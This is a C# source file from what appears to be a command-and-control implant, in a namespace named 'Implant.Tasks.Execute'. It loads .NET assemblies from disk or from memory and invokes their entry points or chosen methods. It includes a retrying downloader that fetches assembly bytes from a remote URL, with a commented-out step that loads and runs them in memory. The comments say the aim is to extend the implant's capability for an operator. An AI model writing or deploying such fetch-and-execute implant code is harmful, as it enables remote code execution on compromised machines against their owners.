using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using static System.Console;

namespace Implant.Tasks.Execute
{
    class LoadFunctions
    {

        public static bool Debug { get; set; } = false;

        // would be cool if these could be called from a yaml or something

        // load assems into running process for expansion of implant capability
        // create task to list loaded assems(see utils ) and their methods for operator viewing and allow operator to pass assem + method into
        // task to execute given method from assem 

        
        public static string ExecuteAssemMethod(Assembly assem, string assemType, string assemMethod){
            var _out = assem.GetType(assemType).GetMethod(assemMethod).Invoke(null, null);
            return _out.ToString();
        }
        
        public static Assembly LoadAssem(string assemPath) {
            var assem = Assembly.LoadFrom(assemPath);
            return assem;
        }

        public static Assembly LoadAssem(byte[] assemBytes) {
            var assem = Assembly.Load(assemBytes);
            return assem;
        }

        public static void LoadAssemAndExecute(string assemPath)
        {
            var assem = LoadAssem(assemPath);
            object[] paramz = new String[] { null };
            assem.EntryPoint.Invoke(null, paramz);
        }

        // load an assem into current appdomain
        public static string BaseLoaderLocal(string assemPath){
            StringBuilder _out = new StringBuilder();
            var assem = LoadAssem(assemPath);

            _out.Append(ExecuteAssemMethod(assem, "", ""));
            
            if (Debug) { WriteLine($"[+] Successfully loaded assem located at {assemPath}"); }

            return _out.ToString();
        }

        // attempt to load assem into mem and retry if fails
        public static byte[] SmraaterLoader(string assemPath, int retry_count, int timeout)
        {

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] assembytes = null;
            int current_retry_count = retry_count;

            while (current_retry_count >= 0 && assembytes == null)
            {
                try
                {
                    assembytes = client.DownloadData(assemPath);
                    if (Debug) { WriteLine($"[+] Fetched assem located at {assemPath}"); }
                }
                catch (WebException)
                {
                    if (current_retry_count == 0) { throw new ArgumentException($"[-] Failed to fetch {assemPath} after {current_retry_count} attempts. Exiting..."); }

                    if (Debug) { WriteLine($"[-] Fetching {assemPath} failed. Retrying in {timeout} seconds."); }
                    current_retry_count = current_retry_count - 1;
                    Thread.Sleep(timeout * 1000);
                }
            }

            return assembytes;

            /*
            var assem = Assembly.Load(assembytes);
            object[] paramz = new String[] { null };
            assem.EntryPoint.Invoke(null, paramz);
            */

            if (Debug) { WriteLine($"[+] Successfully loaded assem located at {assemPath}"); }
        }
        

        // these are tasks, move them over when working on load task
        public static string returnAssemMethods(string assemName)
        {
            StringBuilder _out = new StringBuilder();
            var domain = AppDomain.CurrentDomain;

            _out.AppendLine($"[*] Current AppDomain: {domain}");
            _out.AppendLine($"[*] assemName: {assemName}");

            var strLenth = _out.Length;

            foreach (Assembly assem in domain.GetAssemblies())
            {
                if (assemName == assem.FullName.ToString().Split(',')[0])
                {
                    foreach (var _class in assem.GetTypes())
                    {
                        _out.AppendLine($"\t {_class}");
                        foreach (var method in _class.GetMethods(BindingFlags.Public | BindingFlags.Static)) { _out.AppendLine($"\t\t {method}"); }
                    }
                }
            }

            if(_out.Length > strLenth) { _out.AppendLine($"[-] Assem object {assemName} could not be found in appdomain {domain}"); }

            return _out.ToString();
        }

        public static string GetAssems() {
            StringBuilder _out = new StringBuilder();
            var domain = AppDomain.CurrentDomain;
            _out.AppendLine($"[*] Current AppDomain:\t{domain.FriendlyName}");
            _out.AppendLine($"[*] Loaded modules:");
            foreach (Assembly assem in domain.GetAssemblies()) { _out.AppendLine($"{assem.FullName}"); }
            return _out.ToString();
        }

    }
}